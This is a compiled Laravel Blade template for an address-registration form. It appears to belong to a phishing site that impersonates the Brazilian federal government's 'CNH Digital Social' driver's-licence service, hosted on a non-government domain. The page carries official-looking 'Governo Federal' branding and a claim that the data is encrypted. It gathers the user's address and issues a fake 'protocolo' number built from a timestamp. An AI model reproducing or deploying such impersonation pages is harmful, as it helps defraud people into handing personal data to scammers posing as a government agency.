<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">Cadastro de Endereço</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div class="flex items-start justify-between gap-4">
                        <div>
                            <h1 class="text-2xl md:text-3xl font-bold text-[#1B4F9B] mb-2">Cadastro de Endereço</h1>
                            <p class="text-foreground">Preencha os dados do seu endereço para prosseguir com o processo da CNH Digital Social.</p>
                        </div>
                    </div>
                    <div class="bg-blue-50 border-l-4 border-[#1B4F9B] p-4 rounded">
                        <p class="text-sm text-foreground"><span class="font-bold text-[#1B4F9B]">Importante:</span> Digite seu CEP para verificar as vagas disponíveis. Suas informações são protegidas por criptografia.</p>
                    </div>
                    <form class="space-y-4" action="" id="form-endereco" autocomplete="off">
                        <div>
                            <label class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70" for="cep">CEP <span class="text-red-500">*</span></label>
                            <input class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm" id="cep" placeholder="00000-000" maxlength="9" value="">
                            <p class="mt-2 hidden items-start gap-2 text-sm text-red-600" data-testid="error-message"></p>
                        </div>
                        <div>
                            <label class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70" for="logradouro">Logradouro <span class="text-red-500">*</span></label>
                            <input class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm" id="logradouro" placeholder="Ex: Rua, Avenida, etc." value="">
                            <p class="mt-2 hidden items-start gap-2 text-sm text-red-600" data-testid="error-message"></p>
                        </div>
                        <div>
                            <label class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70" for="numero">Número <span class="text-red-500">*</span></label>
                            <input class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm" id="numero" placeholder="Nº" value="">
                            <p class="mt-2 hidden items-start gap-2 text-sm text-red-600" data-testid="error-message"></p>
                        </div>
                        <div>
                            <label class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70" for="complemento">Complemento</label>
                            <input class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm" id="complemento" placeholder="Ex: Apartamento, bloco, etc." value="">
                        </div>
                        <div>
                            <label class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70" for="bairro">Bairro <span class="text-red-500">*</span></label>
                            <input class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm" id="bairro" placeholder="Bairro" value="">
                            <p class="mt-2 hidden items-start gap-2 text-sm text-red-600" data-testid="error-message"></p>
                        </div>
                        <div>
                            <label class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70" for="cidade">Cidade <span class="text-red-500">*</span></label>
                            <input class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm" id="cidade" placeholder="Cidade" value="">
                            <p class="mt-2 hidden items-start gap-2 text-sm text-red-600" data-testid="error-message"></p>
                        </div>
                        <div>
                            <label class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70" for="estado">Estado <span class="text-red-500">*</span></label>
                            <input class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm" id="estado" placeholder="Estado" value="">
                            <p class="mt-2 hidden items-start gap-2 text-sm text-red-600" data-testid="error-message"></p>
                        </div>
                        <div>
                            <label class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70" for="pontoReferencia">Ponto de referência (opcional)</label>
                            <input class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm" id="pontoReferencia" placeholder="Ex: Próximo ao supermercado..." value="">
                        </div>
                        <button id="btnContinuar" class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 w-full py-6 text-lg font-semibold bg-[#1B4F9B] hover:bg-[#1B4F9B]/90 text-white" type="submit" disabled>
                            Prosseguir para Auto Escolas
                        </button>
                    </form>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
<script>
const userData = JSON.parse(sessionStorage.getItem("userData"));
if(!userData){
    window.location.href = "<?php echo e(url('/login')); ?>";
}
$('#btnContinuar').attr('disabled', true); 
let hasError = false;

function pad6(n) {
    return String(n).padStart(6, '0');
}

function genFromTimeSimple(prefix = 'RAR') {
    const t = Date.now();
    const six = t % 1_000_000;
    return `${prefix}-${pad6(six)}`;
}

$('#cep').mask('00000-000');
$('#cep').on('input', async function () {
    let valor = $(this).val();
    if (valor.length < 9){
        $(this).addClass('border-red-500').removeClass('border-input');
        $('#cep').next('p[data-testid="error-message"]')
        .removeClass('hidden').addClass('flex')
        .html(`
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                stroke-linecap="round" stroke-linejoin="round" 
                class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" x2="12" y1="8" y2="12"></line>
                <line x1="12" x2="12.01" y1="16" y2="16"></line>
            </svg>
            <span>O mínimo de caracteres para esse campo é 9</span>
        `);
        hasError = true;
    }else{
        $(this).removeClass('border-red-500').addClass('border-input');
        $('#cep').next('p[data-testid="error-message"]').removeClass('flex').addClass('hidden').html('');
        $.ajax({
            url: 'https://viacep.com.br/ws/'+valor+'/json/',
            dataType: 'json',
            success: function(resposta){
                if (resposta.cep !== undefined && resposta.cep !== '') {
                    $("#logradouro").val(resposta.logradouro);
                    $("#bairro").val(resposta.bairro);
                    $("#cidade").val(resposta.localidade);
                    $("#estado").val(resposta.uf);
                    $("#numero").focus();
                    $('#btnContinuar').attr('disabled', false);
                    hasError = false;
                }else{
                    $('#cep').addClass('border-red-500').removeClass('border-input');
                    $('#cep').next('p[data-testid="error-message"]')
                    .removeClass('hidden').addClass('flex')
                    .html(`
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                            viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                            stroke-linecap="round" stroke-linejoin="round" 
                            class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                            <circle cx="12" cy="12" r="10"></circle>
                            <line x1="12" x2="12" y1="8" y2="12"></line>
                            <line x1="12" x2="12.01" y1="16" y2="16"></line>
                        </svg>
                        <span>O CEP informado é inválido</span>
                    `);
                    $('#btnContinuar').attr('disabled', true);
                    hasError = true;
                }
            }
        });
    }
});

$(document).on('submit', '#form-endereco', function (e) {
    e.preventDefault();

    if ($('#logradouro').val() === '') {
        $('#logradouro').addClass('border-red-500').removeClass('border-input');
        $('#logradouro').next('p[data-testid="error-message"]')
            .removeClass('hidden').addClass('flex')
            .html(`
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                    stroke-linecap="round" stroke-linejoin="round" 
                    class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" x2="12" y1="8" y2="12"></line>
                    <line x1="12" x2="12.01" y1="16" y2="16"></line>
                </svg>
                <span>O endereço é obrigatório.</span>
            `);
        hasError = true;
    }

    if ($('#numero').val() === '') {
        $('#numero').addClass('border-red-500').removeClass('border-input');
        $('#numero').next('p[data-testid="error-message"]')
            .removeClass('hidden').addClass('flex')
            .html(`
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                    stroke-linecap="round" stroke-linejoin="round" 
                    class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" x2="12" y1="8" y2="12"></line>
                    <line x1="12" x2="12.01" y1="16" y2="16"></line>
                </svg>
                <span>O número é obrigatório.</span>
            `);
        hasError = true;
    }

    if ($('#bairro').val() === '') {
        $('#bairro').addClass('border-red-500').removeClass('border-input');
        $('#bairro').next('p[data-testid="error-message"]')
            .removeClass('hidden').addClass('flex')
            .html(`
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                    stroke-linecap="round" stroke-linejoin="round" 
                    class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" x2="12" y1="8" y2="12"></line>
                    <line x1="12" x2="12.01" y1="16" y2="16"></line>
                </svg>
                <span>O bairro é obrigatório.</span>
            `);
        hasError = true;
    }

    if ($('#cidade').val() === '') {
        $('#cidade').addClass('border-red-500').removeClass('border-input');
        $('#cidade').next('p[data-testid="error-message"]')
            .removeClass('hidden').addClass('flex')
            .html(`
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                    stroke-linecap="round" stroke-linejoin="round" 
                    class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" x2="12" y1="8" y2="12"></line>
                    <line x1="12" x2="12.01" y1="16" y2="16"></line>
                </svg>
                <span>A cidade é obrigatório.</span>
            `);
        hasError = true;
    }
    
    if ($('#estado').val() === '') {
        $('#estado').addClass('border-red-500').removeClass('border-input');
        $('#estado').next('p[data-testid="error-message"]')
            .removeClass('hidden').addClass('flex')
            .html(`
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                    stroke-linecap="round" stroke-linejoin="round" 
                    class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" x2="12" y1="8" y2="12"></line>
                    <line x1="12" x2="12.01" y1="16" y2="16"></line>
                </svg>
                <span>O estado é obrigatório.</span>
            `);
        hasError = true;
    }

    if (hasError) return;

    $('#btnContinuar').attr('disabled', true);

    let userAddress = {};
    userAddress.cep = $('#cep').val();
    userAddress.endereco = $('#logradouro').val();
    userAddress.numero = $('#numero').val();
    userAddress.bairro = $('#bairro').val();
    userAddress.cidade = $('#cidade').val();
    userAddress.estado = $('#estado').val();
    sessionStorage.setItem("userAddress", JSON.stringify(userAddress));

    userData.protocolo = genFromTimeSimple();
    sessionStorage.setItem("userData", JSON.stringify(userData));

    window.location.href = "<?php echo e(url('/auto-escola')); ?>";
  
});

</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/endereco.blade.php ENDPATH**/ ?>